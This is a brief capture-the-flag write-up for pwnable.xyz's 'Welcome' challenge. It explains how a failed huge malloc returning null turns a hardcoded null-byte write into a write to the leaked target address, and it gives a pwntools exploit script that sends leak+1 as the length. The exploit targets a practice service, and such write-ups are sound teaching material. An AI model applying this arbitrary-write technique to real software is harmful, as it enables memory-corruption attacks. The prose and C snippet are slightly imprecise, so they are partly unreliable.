# Welcome

The challenge wants  me to modify the variable of an allocated  chunk to get the flag.

It first leaks an address which is the target chunk,  then asks for an input for my chunk.

Giving malloc a really large input makes it fail, returning 0.

Since the program hardcodes
```c 
*(my_chunk + len-1) = 0.
```

Now that my chunk is a zero pointer, and len is the address of the target chunk, the following line:

```c
(*BYTE) (my_chunk + len) =0;
```
sets exactly the target to 0

```py
from pwn import *

p = process('./challenge')
p = remote('svc.pwnable.xyz', 30000)

junnk = p.recvuntil(b'Leak: ')
leak = int(p.recvline().strip(), 16)

print(hex(leak))

leak+=1

p.sendline(str(leak))
p.sendafter(b'message: ', b'\x00')

p.interactive()
```